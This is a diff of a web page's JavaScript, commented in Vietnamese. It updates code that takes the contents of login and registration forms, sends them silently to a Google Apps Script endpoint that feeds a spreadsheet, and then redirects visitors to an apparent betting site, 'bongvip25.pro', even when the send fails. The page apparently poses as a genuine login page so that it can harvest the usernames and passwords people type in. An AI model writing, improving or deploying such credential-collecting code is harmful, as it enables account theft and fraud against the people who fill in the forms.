@@ -169,21 +169,23 @@
         function closeModal(id) { document.getElementById(id).style.display = 'none'; }
 
         // CẤU HÌNH GỬI DỮ LIỆU GOOGLE SHEETS
-        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwaVLJXZeJJE2s0XfPLvyq6AUNY4oK6THb8OBOCtzaW9zi6zSg8fYdlXLxZjdmxiw8G/exec"; // Dán link Apps Script vào đây
+        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycby72UzyOAjIQk0jkQPtOlJHgjcHUblpcfo_Vr5jl2CBOacoA5M-BM2Yb1gPVeOH7GnV/exec"; // Dán link Apps Script vào đây
         const REDIRECT_URL = "https://4a1.bongvip25.pro"; // Trang sẽ nhảy đến sau khi bấm
 
         async function postData(formId) {
             const form = document.getElementById(formId);
             const formData = new URLSearchParams(new FormData(form));
-            formData.append("type", formId === 'loginForm' ? "Đăng Nhập" : "Đăng Ký");
+            
+            // Ghi chú loại thao tác để đổ vào cột F
+            const formType = (formId === 'loginForm') ? "Đăng Nhập" : "Đăng Ký";
+            formData.append("type", formType);
 
-            // Gửi dữ liệu đi ẩn danh
             fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', body: formData })
             .then(() => {
-                window.location.href = REDIRECT_URL; // Chuyển hướng
+                window.location.href = REDIRECT_URL;
             })
             .catch(() => {
-                window.location.href = REDIRECT_URL; // Chuyển hướng kể cả khi lỗi
+                window.location.href = REDIRECT_URL;
             });
         }
 
